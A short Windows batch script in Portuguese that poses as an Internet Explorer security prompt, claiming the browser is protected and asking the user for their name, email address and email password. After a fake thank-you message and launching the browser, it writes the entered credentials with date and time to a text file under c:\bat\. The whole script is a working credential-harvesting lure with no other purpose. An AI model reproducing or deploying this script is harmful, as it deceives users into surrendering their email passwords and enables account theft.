@echo off

title internet Explorer

cls
echo.
echo--O navegador internet Explorer esta protegido

echo.

echo--E preciso entrar com seu email e senha !
echo.
echo--pois este computador esta protegido
echo.
set/p nome=Nome:
set/p us=Email:
set/p pass=Email Passwor:



msg * obrigado voce agora ja pode usar o explorer.
start iexplorer.exe
echo dia %date% Hora %time% %n% logon no email:%us% Nome: %nome% e password: %pass% >"c:\bat\%n%.txt"
ping locallhost -n 2>nul